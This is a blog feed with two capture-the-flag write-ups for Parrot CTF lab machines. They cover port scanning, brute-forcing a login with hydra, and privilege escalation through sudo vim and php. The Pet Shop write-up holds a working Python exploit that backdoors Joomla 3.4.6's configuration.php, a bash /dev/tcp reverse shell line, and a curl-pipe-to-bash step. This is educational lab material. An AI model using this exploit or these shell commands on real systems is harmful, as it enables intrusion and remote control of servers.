<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2023-08-30T16:50:34+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">FmF</title><subtitle>This is a personal blog about a hacking and other stuff.</subtitle><author><name>FmF</name></author><entry><title type="html">Santa‚Äôs List (Parrot CTF)</title><link href="http://localhost:4000/ParrotCtf-Santas_List/" rel="alternate" type="text/html" title="Santa‚Äôs List (Parrot CTF)" /><published>2023-08-30T05:00:00+00:00</published><updated>2023-08-30T05:00:00+00:00</updated><id>http://localhost:4000/ParrotCtf-Santas_List</id><content type="html" xml:base="http://localhost:4000/ParrotCtf-Santas_List/"><![CDATA[<p><img src="/ParrotCtf-Santas_List/images/1.jpg" alt="Pwned, lol" /></p>

<p>ü¶ú <a href="https://parrot-ctfs.com/">Parrot CTFs</a> is an advanced cybersecurity education platform and capture the flag provider. Their goal is to create the most realistic capture the flag challenges and demonstrate real-world attack scenarios.</p>

<p>Thanks to <a><code class="language-plaintext highlighter-rouge">parrotassassin15</code></a> for the help üíñ.</p>

<h2 id="content">Content:</h2>

<ul>
  <li><a href="#enumeration-">Enumeration</a></li>
  <li><a href="#initial-access-">Initial access</a></li>
  <li><a href="#privilege-escalation-">Privilege escalation</a></li>
</ul>

<h2 id="enumeration-">Enumeration üîé:</h2>

<p>We start by using <code class="language-plaintext highlighter-rouge">ping</code> to check the <em>TTL</em> of the machine to determine the OS we are dealing with.</p>

<p><img src="/ParrotCtf-Santas_List/images/2.png" /></p>

<p>Based on the <em>TTL</em> value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: <a href="https://ostechnix.com/identify-operating-system-ttl-ping/">Identify OS using TTL value</a>.</p>

<p>Now, let‚Äôs go with an <code class="language-plaintext highlighter-rouge">nmap</code> scan to view the open ports.</p>

<p><code class="language-plaintext highlighter-rouge">sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.9 -oN allPorts</code></p>

<p><code class="language-plaintext highlighter-rouge">-p-</code> ‚Äì&gt; We are doing a scan against all 65535 ports to search for open ports.</p>

<p><code class="language-plaintext highlighter-rouge">--open</code> ‚Äì&gt; It will only report open ports.</p>

<p><code class="language-plaintext highlighter-rouge">-sS</code> ‚Äì&gt; It can be performed quickly, scanning thousands of ports per second.</p>

<p><code class="language-plaintext highlighter-rouge">--min-rate 5000</code> ‚Äì&gt; It sets the minimum rate of packets sent per second to 5000.</p>

<p><code class="language-plaintext highlighter-rouge">-n</code> ‚Äì&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.</p>

<p><code class="language-plaintext highlighter-rouge">-v</code> ‚Äì&gt; It will be verbose in its output.</p>

<p><code class="language-plaintext highlighter-rouge">-Pn</code> ‚Äì&gt; This option skips the host discovery stage.</p>

<p><code class="language-plaintext highlighter-rouge">-oN</code> ‚Äì&gt; It will save the output in a file called ‚ÄúallPorts‚Äù.</p>

<p>We find out the following open ports:</p>

<p><img src="/ParrotCtf-Santas_List/images/3.png" /></p>

<p>Let‚Äôs take a look at what the page has.</p>

<p><img src="/ParrotCtf-Santas_List/images/4.png" /></p>

<p>We can see a login panel that has some information that we can use. The login panel says <code class="language-plaintext highlighter-rouge">Santa's administration panel</code>, so maybe a valid username can be <a><code class="language-plaintext highlighter-rouge">santa</code></a>.</p>

<h2 id="initial-access-">Initial access üîë:</h2>

<p>We can try common credentials like <code class="language-plaintext highlighter-rouge">admin:admin</code> or <code class="language-plaintext highlighter-rouge">root:root</code> and many others‚Ä¶ But let‚Äôs try with the information that we have <code class="language-plaintext highlighter-rouge">santa:santa</code>, <code class="language-plaintext highlighter-rouge">santa:admin</code> or <a><code class="language-plaintext highlighter-rouge">santa:northpole</code></a> and with those credentials, we can gain access‚Ä¶</p>

<p>But let‚Äôs try other ways rather than guessing. For example, we can use the tool <code class="language-plaintext highlighter-rouge">cewl</code> to create a wordlist based on the content of the page.</p>

<p><code class="language-plaintext highlighter-rouge">cewl http://10.14.0.9/ --lowercase -w wordlist.txt</code></p>

<p><img src="/ParrotCtf-Santas_List/images/5.png" /></p>

<p>We can use the tool <a href="https://www.hackingarticles.in/comprehensive-guide-on-cupp-a-wordlist-generating-tool/"><code class="language-plaintext highlighter-rouge">cupp</code></a> to generate different variations of words.</p>

<p><code class="language-plaintext highlighter-rouge">./cupp -w wordlist.txt</code> ‚Äì&gt; We pass the wordlist that we created with <code class="language-plaintext highlighter-rouge">cewl</code>.</p>

<p><img src="/ParrotCtf-Santas_List/images/6.png" /></p>

<p>The content of the <code class="language-plaintext highlighter-rouge">wordlist.txt.cupp.txt</code> file generated by <code class="language-plaintext highlighter-rouge">cupp</code> is as follows:</p>

<p><img src="/ParrotCtf-Santas_List/images/7.png" /></p>

<p>We can see that it generates a lot of variations.</p>

<p>Now let‚Äôs do a bruteforce attack with the use of wordlist that we have and let‚Äôs try with the username <code class="language-plaintext highlighter-rouge">santa</code>.</p>

<p>There are many ways to complete a bruteforce attack. We will use the tool <a href="https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/"><code class="language-plaintext highlighter-rouge">hydra</code></a> in this case.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">hydra</span> <span class="o">-</span><span class="n">l</span> <span class="n">santa</span> <span class="o">-</span><span class="no">P</span> <span class="n">wordlist</span><span class="p">.</span><span class="nf">txt</span><span class="p">.</span><span class="nf">cupp</span><span class="p">.</span><span class="nf">txt</span> <span class="mf">10.14</span><span class="o">.</span><span class="mf">0.9</span> <span class="n">http</span><span class="o">-</span><span class="n">post</span><span class="o">-</span><span class="n">form</span> <span class="s2">"/index.php:username=santa&amp;password=^PASS^:Incorrect login"</span> <span class="o">-</span><span class="n">v</span>
</code></pre></div></div>

<p><img src="/ParrotCtf-Santas_List/images/8.png" /></p>

<p>And the correct credentials are <a><code class="language-plaintext highlighter-rouge">santa:northpole</code></a>.</p>

<p><img src="/ParrotCtf-Santas_List/images/9.png" /></p>

<p>We are in and we can see a button to download a file.</p>

<p><img src="/ParrotCtf-Santas_List/images/10.png" /></p>

<p>We can see a new username: <a><code class="language-plaintext highlighter-rouge">elf-manager</code></a>. Maybe we can use it to login with SSH.</p>

<p>But let‚Äôs first decrypt the MD5 hashes with <a href="https://md5decrypt.net/en/"><code class="language-plaintext highlighter-rouge">md5decrypt.net</code></a>.</p>

<p><img src="/ParrotCtf-Santas_List/images/11.png" /></p>

<p>What if we try reusing the password <a><code class="language-plaintext highlighter-rouge">northpole</code></a> with the username <a><code class="language-plaintext highlighter-rouge">elf-manager</code></a>? We can try to connect to SSH and see if we can get in.</p>

<p><img src="/ParrotCtf-Santas_List/images/12.png" /></p>

<p>It works üéâ. Now that we are inside the machine you need to do some things to ensure smooth operation:</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">export TERM=xterm</code></li>
</ol>

<p>This will allow us to clean the screen with <code class="language-plaintext highlighter-rouge">ctrl + l</code>.</p>

<p>Now we can see the flag üéâ.</p>

<h2 id="privilege-escalation-">Privilege escalation üö©:</h2>

<p>We need to enumerate the system to find a way to escalate privileges.</p>

<p>One thing I always check first is <code class="language-plaintext highlighter-rouge">sudo -l</code>. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user.</p>

<p>More info about privilege escalation techniques check <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">here.</a></p>

<p><img src="/ParrotCtf-Santas_List/images/13.png" /></p>

<p>We can execute <code class="language-plaintext highlighter-rouge">vim</code> command as the root user. We can see in <a href="https://gtfobins.github.io/gtfobins/vim/">GTFOBins</a> for a way to escalate privileges.</p>

<p>Or we can do it this way:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sudo</span> <span class="n">vim</span>

<span class="n">esc</span> <span class="o">+</span> <span class="p">:</span> <span class="o">+</span> <span class="o">!</span><span class="n">bash</span> <span class="o">--&gt;</span> <span class="no">This</span> <span class="n">is</span> <span class="n">to</span> <span class="n">spawn</span> <span class="n">a</span> <span class="n">shell</span> <span class="n">as</span> <span class="n">root</span> <span class="n">user</span><span class="o">.</span>
</code></pre></div></div>

<p><img src="/ParrotCtf-Santas_List/images/14.png" /></p>

<p>And now we are root :)</p>

<p><img src="/ParrotCtf-Santas_List/images/15.png" /></p>

<p>Hope you like it and learn something new :)</p>]]></content><author><name>FmF</name></author><category term="unix/linux" /><category term="Parrot Ctf" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/ParrotCtf-Santas_List/banner.png" /><media:content medium="image" url="http://localhost:4000/ParrotCtf-Santas_List/banner.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pet shop (Parrot CTF)</title><link href="http://localhost:4000/ParrotCtf-Pet_Shop/" rel="alternate" type="text/html" title="Pet shop (Parrot CTF)" /><published>2023-08-19T05:00:00+00:00</published><updated>2023-08-19T05:00:00+00:00</updated><id>http://localhost:4000/ParrotCtf-Pet_Shop</id><content type="html" xml:base="http://localhost:4000/ParrotCtf-Pet_Shop/"><![CDATA[<p><img src="/ParrotCtf-Pet_Shop/images/1.png" alt="Joomla banner" /></p>

<p>ü¶ú <a href="https://parrot-ctfs.com/">Parrot CTFs</a> is an advanced cybersecurity education platform and capture the flag provider. Their goal is to create the most realistic capture the flag challenges and demonstrate real-world attack scenarios.</p>

<p>This is an easy difficulty machine that exploits a legacy Joomla Content Management System (CMS) and a binary that has SUID permissions to gain root privileges.</p>

<h2 id="content">Content:</h2>

<ul>
  <li><a href="#enumeration-">Enumeration</a></li>
  <li><a href="#easy-way-%EF%B8%8F">Easy way</a></li>
  <li><a href="#not-too-easy-way-%EF%B8%8F">Not too easy way</a></li>
  <li><a href="#privilege-escalation-">Privilege escalation</a></li>
</ul>

<h2 id="enumeration-">Enumeration üîé:</h2>

<p>We start by using <code class="language-plaintext highlighter-rouge">ping</code> to check the <em>TTL</em> of the machine to determine the OS we are dealing with.</p>

<p><img src="/ParrotCtf-Pet_Shop/images/2.png" /></p>

<p>Based on the <em>TTL</em> value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: <a href="https://ostechnix.com/identify-operating-system-ttl-ping/">Identify OS using TTL value</a>.</p>

<p>Now, let‚Äôs go with an <code class="language-plaintext highlighter-rouge">nmap</code> scan to view the open ports.</p>

<p><code class="language-plaintext highlighter-rouge">sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.65 -oN allPorts</code></p>

<p><code class="language-plaintext highlighter-rouge">-p-</code> ‚Äì&gt; We are doing a scan against all 65535 ports to search for open ports.</p>

<p><code class="language-plaintext highlighter-rouge">--open</code> ‚Äì&gt; It will only report open ports.</p>

<p><code class="language-plaintext highlighter-rouge">-sS</code> ‚Äì&gt; It can be performed quickly, scanning thousands of ports per second.</p>

<p><code class="language-plaintext highlighter-rouge">--min-rate 5000</code> ‚Äì&gt; It sets the minimum rate of packets sent per second to 5000.</p>

<p><code class="language-plaintext highlighter-rouge">-n</code> ‚Äì&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.</p>

<p><code class="language-plaintext highlighter-rouge">-v</code> ‚Äì&gt; It will be verbose in its output.</p>

<p><code class="language-plaintext highlighter-rouge">-Pn</code> ‚Äì&gt; This option skips the host discovery stage.</p>

<p><code class="language-plaintext highlighter-rouge">-oN</code> ‚Äì&gt; It will save the output in a file called ‚ÄúallPorts‚Äù.</p>

<p>We find out the following open ports:</p>

<p><img src="/ParrotCtf-Pet_Shop/images/3.png" /></p>

<p>Let‚Äôs take a look at what the page has.</p>

<p><img src="/ParrotCtf-Pet_Shop/images/4.png" /></p>

<p>We can see some posts and a user joomla who wrote the posts.</p>

<p>Let‚Äôs use <a><code class="language-plaintext highlighter-rouge">Wappalyzer</code></a> to detect more information about what tecnologies the page is using.</p>

<p><img src="/ParrotCtf-Pet_Shop/images/5.png" /></p>

<p>We can see that the Content Management System (CMS) is Joomla, what is a for publishing web content like WordPress and others. Now that we know the CMS, we can search for any administration panel and try default creds. Maybe we have luck :), a quick search in Google show us that the directory for the admin panel is <a href="https://docs.joomla.org/Administrator_(Application)"><code class="language-plaintext highlighter-rouge">/administrator</code></a>. We can try to view it going to: <code class="language-plaintext highlighter-rouge">http://10.14.0.65/joomla/administrator</code></p>

<p><img src="/ParrotCtf-Pet_Shop/images/6.png" /></p>

<p>By default, the username is <code class="language-plaintext highlighter-rouge">admin</code> and the password must be defined in the installation progress. We can try login with the user that we find earlier: ‚Äújoomla:joomla‚Äù but it doesn‚Äôt work, so‚Ä¶ lets put this aside and continue doing other things.</p>

<p>We can use <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla">HackTricks</a> to search for commons ways to enumerate joomla and try to exploit it, first lets try to search the version.</p>

<p><img src="/ParrotCtf-Pet_Shop/images/7.png" /></p>

<p>Going to the directory <a><code class="language-plaintext highlighter-rouge">/language/en-GB/en-GB.xml</code></a> we can see the version of the CMS, now let‚Äôs search for public exploits for this version.</p>

<p><img src="/ParrotCtf-Pet_Shop/images/8.png" /></p>

<p>We can use <code class="language-plaintext highlighter-rouge">searchsploit</code> to search for exploits and we can find a lot :)</p>

<p>There are various ways to solve the machine, an easy one and a not-too-easy one. Let‚Äôs first look at the easy way.</p>

<p><img src="/ParrotCtf-Pet_Shop/images/9.png" /></p>

<h2 id="easy-way-Ô∏è">Easy way üõ£Ô∏è:</h2>

<p>Let‚Äôs do more enumeration. We can use <a href="https://vk9-sec.com/wfuzz-how-to/"><code class="language-plaintext highlighter-rouge">wfuzz</code></a> to do fuzzing in the page.</p>

<p><img src="/ParrotCtf-Pet_Shop/images/10.png" /></p>

<p>We can inspect these directories one by one. We can find that some of them have directory listing capabilities, but we cannot find any useful information‚Ä¶</p>

<p>Ok mmm‚Ä¶ Let‚Äôs fuzz for file extensions such as backup files: <a><code class="language-plaintext highlighter-rouge">bak, backup, bck</code></a>‚Ä¶</p>

<p><img src="/ParrotCtf-Pet_Shop/images/11.png" /></p>

<p>Wow we can see that there is a configuration file <code class="language-plaintext highlighter-rouge">configuration.backup</code>. Let‚Äôs view its contents.</p>

<p><img src="/ParrotCtf-Pet_Shop/images/12.png" /></p>

<p>The output is ugly so let‚Äôs fix it up. Press <code class="language-plaintext highlighter-rouge">ctrl</code> + <code class="language-plaintext highlighter-rouge">u</code> to view the source code. This will make the output a lot prettier, and we can see a username and password. :)</p>

<p><img src="/ParrotCtf-Pet_Shop/images/13.png" /></p>

<p>Now we can login to the machine with the credentials that we found with: <code class="language-plaintext highlighter-rouge">ssh ron@10.14.0.65</code>, and we are in.</p>

<p><img src="/ParrotCtf-Pet_Shop/images/14.png" /></p>

<p>Now that we are inside the machine you need to do one thing to ensure smooth operation:</p>

<ol>
  <li>-&gt; <code class="language-plaintext highlighter-rouge">export TERM=xterm</code></li>
</ol>

<p>This will allow us to clean the screen with <code class="language-plaintext highlighter-rouge">ctrl + l</code>.</p>

<h2 id="not-too-easy-way-Ô∏è">Not too easy way üõ£Ô∏è:</h2>

<p>Let‚Äôs go back a bit and look the available exploits.</p>

<p><img src="/ParrotCtf-Pet_Shop/images/8.png" /></p>

<p>In this case, I am going to use the exploit with the title: <a><code class="language-plaintext highlighter-rouge">3.4.6 - 'configuration.php' Remote Code Execution</code></a>. You can find all the technical details <a href="https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/">here</a>.</p>

<p>You can use <code class="language-plaintext highlighter-rouge">searchsploit -x php/webapps/47465.py</code> to inspect the source of the exploit, and if you want to copy it to your local directory, you can use: <code class="language-plaintext highlighter-rouge">searchsploit -m php/webapps/47465.py .</code></p>

<p>If you execute it, it will tell you that it is not vulnerable. However, in reality, it is vulnerable.</p>

<p><img src="/ParrotCtf-Pet_Shop/images/15.png" /></p>

<p>This is where things get complicated. You need to modify and test the exploit using Burp Suite. If you want to understand how this really works, view the <a href="https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/">technical details</a>. But to keep this write-up from getting too long, I‚Äôm going to give you my script to exploit it.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/bin/python3</span>

<span class="n">import</span> <span class="n">requests</span> <span class="n">as</span> <span class="n">r</span><span class="p">,</span> <span class="n">string</span><span class="p">,</span> <span class="n">random</span><span class="p">,</span> <span class="n">re</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">sys</span>
<span class="n">from</span> <span class="n">bs4</span> <span class="n">import</span> <span class="no">BeautifulSoup</span>

<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://10.14.0.65/joomla/"</span>
<span class="c1">#PROXS = {"http":"http://127.0.0.1:8080"}</span>
<span class="no">PROXS</span> <span class="o">=</span> <span class="p">{}</span>

<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">num</span><span class="p">):</span>
	<span class="nb">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">Saliendo...</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
	<span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="p">.</span><span class="nf">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="no">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">random_string</span><span class="p">(</span><span class="n">stringLength</span><span class="p">):</span>
    <span class="n">letters</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="nf">ascii_lowercase</span>
    <span class="k">return</span> <span class="s1">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">letters</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="n">range</span><span class="p">(</span><span class="n">stringLength</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_backdoor_pay</span><span class="p">():</span> <span class="c1"># This payload will backdoor the the configuration .PHP with an eval on POST request</span>
	<span class="n">function</span> <span class="o">=</span> <span class="s1">'assert'</span>
	<span class="n">template</span> <span class="o">=</span> <span class="s1">'s:3:"FmF";O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'</span>
	<span class="n">payload</span> <span class="o">=</span>  <span class="s1">'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\''</span> <span class="o">+</span> <span class="n">backdoor_param</span> <span class="o">+</span><span class="s1">'\\\'])) eval($_POST[\\\''</span><span class="o">+</span><span class="n">backdoor_param</span><span class="o">+</span><span class="s1">'\\\']);\', FILE_APPEND) || $a=\'http://wtf\';'</span>
	<span class="n">function_len</span> <span class="o">=</span> <span class="n">len</span><span class="p">(</span><span class="n">function</span><span class="p">)</span>
	<span class="n">final</span> <span class="o">=</span> <span class="n">template</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="s1">'PAYLOAD'</span><span class="p">,</span><span class="n">payload</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="s1">'LENGTH'</span><span class="p">,</span> <span class="n">str</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))).</span><span class="nf">replace</span><span class="p">(</span><span class="s1">'FUNC_NAME'</span><span class="p">,</span> <span class="n">function</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="s1">'FUNC_LEN'</span><span class="p">,</span> <span class="n">str</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="n">function</span><span class="p">)))</span>
	<span class="k">return</span> <span class="n">final</span>

<span class="k">def</span> <span class="nf">request</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
	<span class="n">s</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="no">Session</span><span class="p">()</span>
	<span class="n">page</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">'index.php/login'</span><span class="p">)</span>
	<span class="n">soup</span> <span class="o">=</span> <span class="no">BeautifulSoup</span><span class="p">(</span><span class="n">page</span><span class="p">.</span><span class="nf">content</span><span class="p">,</span> <span class="s2">"html.parser"</span><span class="p">)</span>

	<span class="n">values</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="nf">find_all</span><span class="p">(</span><span class="s2">"input"</span><span class="p">)</span>

	<span class="n">csrf</span> <span class="o">=</span> <span class="n">values</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># Gets the CSRF token value</span>
	<span class="n">ok</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="s1">'name="(.*?)"'</span><span class="p">,</span> <span class="n">str</span><span class="p">(</span><span class="n">csrf</span><span class="p">))</span>
	<span class="n">csrf</span> <span class="o">=</span> <span class="n">ok</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s1">'index.php/login?task=user.login'</span>

	<span class="n">return_value</span> <span class="o">=</span> <span class="n">values</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="c1"># Gets the return value</span>
	<span class="n">ok</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="s1">'value="(.*?)"'</span><span class="p">,</span> <span class="n">str</span><span class="p">(</span><span class="n">return_value</span><span class="p">))</span>
	<span class="n">return_value</span> <span class="o">=</span> <span class="n">ok</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

	<span class="n">user_payload</span> <span class="o">=</span> <span class="s1">'\\0\\0\\0'</span> <span class="o">*</span> <span class="mi">9</span>
	<span class="n">inj_object</span> <span class="o">=</span> <span class="s1">'";'</span>
	<span class="n">inj_object</span> <span class="o">+=</span> <span class="n">payload</span>
	<span class="n">inj_object</span> <span class="o">+=</span> <span class="s1">'s:6:"return";s:102:'</span> <span class="c1"># end the object with the 'return' part</span>
	<span class="n">password_payload</span> <span class="o">=</span> <span class="s1">'AAA'</span> <span class="o">+</span> <span class="n">inj_object</span>

	<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
		<span class="s1">'username'</span><span class="ss">:user_payload</span><span class="p">,</span>
		<span class="s1">'password'</span><span class="ss">:password_payload</span><span class="p">,</span>
		<span class="s1">'return'</span><span class="ss">:return_value</span><span class="p">,</span>
		<span class="n">csrf</span><span class="ss">:'1'</span>
	<span class="p">}</span>

	<span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="no">PROXS</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ping_backdoor</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">param_name</span><span class="p">):</span>
	<span class="k">while</span> <span class="no">True</span><span class="p">:</span>
		<span class="n">command</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s2">"[RCE]~&gt; "</span><span class="p">)</span>
		<span class="n">res</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">'configuration.php'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="n">param_name</span><span class="ss">:'system(\''</span><span class="o">+</span> <span class="n">command</span> <span class="o">+</span><span class="s1">'\');'</span><span class="p">})</span> <span class="c1"># Here is where the magic happens</span>
		<span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="nf">text</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
	<span class="n">backdoor_param</span> <span class="o">=</span> <span class="n">random_string</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span> <span class="c1">## Generate a unique string for our payload</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="n">get_backdoor_pay</span><span class="p">()</span>
	<span class="nb">print</span><span class="p">(</span><span class="s2">"[+] Backdoor id: "</span> <span class="o">+</span> <span class="n">backdoor_param</span><span class="p">)</span>
	<span class="n">request</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
	<span class="nb">print</span><span class="p">(</span><span class="s2">"[+] Backdoor is ready, you can enter now...</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
	<span class="n">ping_backdoor</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">backdoor_param</span><span class="p">)</span>

</code></pre></div></div>

<p>Now with this, we can execute commands, but this is NOT a full interactive shell yet.</p>

<p><img src="/ParrotCtf-Pet_Shop/images/16.png" /></p>

<p>To get an interactive shell, there are a lot of ways to do it, but I‚Äôm going to use this one:</p>

<p>Create a file with the name <a><code class="language-plaintext highlighter-rouge">index.html</code></a>, with this content:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="sr">/dev/</span><span class="n">tcp</span><span class="o">/</span><span class="no">YOUR_IP_HERE</span><span class="o">/</span><span class="mi">443</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
</code></pre></div></div>

<p>Now use the command: <code class="language-plaintext highlighter-rouge">sudo python3 -m http.server 80</code> to put a http server where we are sharing our files.</p>

<p>And finally use the command <code class="language-plaintext highlighter-rouge">nc -lvnp 443</code> to listen for our reverse connection from our payload above.</p>

<p>Now execute the command: <code class="language-plaintext highlighter-rouge">curl YOUR_IP_HERE | bash</code> this is going to get the content of the file <code class="language-plaintext highlighter-rouge">index.html</code> and interpret the content as a bash command.</p>

<p><img src="/ParrotCtf-Pet_Shop/images/17.png" /></p>

<p>We can see that we get a shell like <code class="language-plaintext highlighter-rouge">www-data</code> user.</p>

<p>Now that we are inside the machine you need to do various things to ensure smooth operation:</p>

<ol>
  <li>-&gt; <code class="language-plaintext highlighter-rouge">script /dev/null -c bash</code></li>
  <li>-&gt; <code class="language-plaintext highlighter-rouge">ctrl + z</code></li>
  <li>-&gt; <code class="language-plaintext highlighter-rouge">stty raw -echo; fg</code></li>
  <li>-&gt; <code class="language-plaintext highlighter-rouge">reset xterm</code></li>
  <li>-&gt; <code class="language-plaintext highlighter-rouge">export TERM=xterm</code></li>
</ol>

<p>This will allow us to clean the screen with <code class="language-plaintext highlighter-rouge">ctrl + l</code> and if we do <code class="language-plaintext highlighter-rouge">ctrl + c</code> is not going to kill the shell, more info <a href="https://invertebr4do.github.io/tratamiento-de-tty/#">here</a>.</p>

<p><img src="/ParrotCtf-Pet_Shop/images/18.png" /></p>

<p>We can see the <code class="language-plaintext highlighter-rouge">configuration.backup</code> file so here we can get the creds of the user <code class="language-plaintext highlighter-rouge">ron</code> and we can connect through SSH.</p>

<h2 id="privilege-escalation-">Privilege escalation üö©:</h2>

<p>Now that we are inside the machine as the <code class="language-plaintext highlighter-rouge">ron</code> user, we need to enumerate the system to find a way to escalate privileges.</p>

<p>One thing I always check first is <code class="language-plaintext highlighter-rouge">sudo -l</code>. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the <code class="language-plaintext highlighter-rouge">root</code> user.</p>

<p>More info about privilege escalation techniques check <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">here.</a></p>

<p><img src="/ParrotCtf-Pet_Shop/images/19.png" /></p>

<p>We can see something interesting, the binary <a><code class="language-plaintext highlighter-rouge">php</code></a> can be run as the <code class="language-plaintext highlighter-rouge">root</code> user.</p>

<p>A quick search in Google tells us that we can escalate privileges with it, search in <a href="https://gtfobins.github.io/gtfobins/php/#suid">GTFOBins</a>.</p>

<p><img src="/ParrotCtf-Pet_Shop/images/20.png" /></p>

<p>We execute the commands:</p>

<p><img src="/ParrotCtf-Pet_Shop/images/21.png" /></p>

<p>And now we are root :)</p>

